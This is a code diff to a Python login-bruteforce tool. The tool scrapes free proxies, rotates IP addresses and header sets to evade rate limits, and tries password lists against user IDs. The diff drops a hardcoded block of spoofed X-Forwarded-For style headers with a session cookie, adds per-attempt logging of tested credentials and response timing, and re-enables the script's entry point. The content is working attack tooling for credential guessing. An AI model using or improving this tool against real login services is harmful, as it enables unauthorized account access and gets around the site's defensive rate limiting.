@@ -4,17 +4,6 @@ from bs4 import BeautifulSoup
 import argparse
 import json
 
-headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
-    "Accept": "text/html,application/xhtml+xml,application/xml",
-    "Cookie": "session=xAxPv4Zwe9rMb9wCLsbOqXI3CVvPzPu5",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "X-Originating-IP": "127.0.0.1",
-    "X-Forwarded-For": "127.0.0.1",
-    "X-Remote-IP": "127.0.0.1",
-    "X-Remote-Addr": "127.0.0.1"
-}
-
 def getIPs():
     response = requests.get("https://sslproxies.org/") 
     soup = BeautifulSoup(response.content, 'html5lib') 
@@ -54,8 +43,14 @@ class Bruteforce:
                             }, headers=self.headers[self.headerId])
             resCode = str(res.status_code)
             resText = res.text
+            resTime = res.elapsed.total_seconds()
             if resCode[0] not in ['2', '3']:
                 raise Exception("Server Rate limit") 
+            with open("bruteforce.log", "a") as f:
+                f.write(f"{uid} {passw} tested\n")
+                f.write(f"response code - {resCode}, response length - {len(resText)}, response time - {resTime} ")
+                f.write("\n.......................\n")
+            #print(f"{uid} {passw} tested\n")
         except Exception as e:
             if self.ipId < len(self.ipList):
                 self.ipId += 1
@@ -73,6 +68,7 @@ class Bruteforce:
 
     def bruteforce(self):
         for uid in self.idList:
+            T = []
             for passw in self.passList:
                 response = self.sendreq(passw, uid)
                 while not response[0] and self.headerId > len(self.headers):
@@ -110,7 +106,7 @@ def main():
                          required=True,
                          help='The file consisting of all the required headers')
     passwords_group = parser.add_mutually_exclusive_group(required=True)
-    passwords_group.add_argument('--password', '  ',
+    passwords_group.add_argument('--password', '-p',
                                  action='store',
                                  help='single password')
     passwords_group.add_argument('--password-file', '-pf',
@@ -131,6 +127,9 @@ def main():
                                  action='store',
                                  help='value if not present in response terminates the bruteforce')
     options = parser.parse_args()
+    
+    with open("bruteforce.log", "w") as f:
+        f.write("")
     
     url = options.url
     with open(options.headers_file, 'r') as f:
@@ -155,5 +154,5 @@ def main():
 
 
 if __name__=="__main__":
-    #main()
-    pass
+    main()
+ 
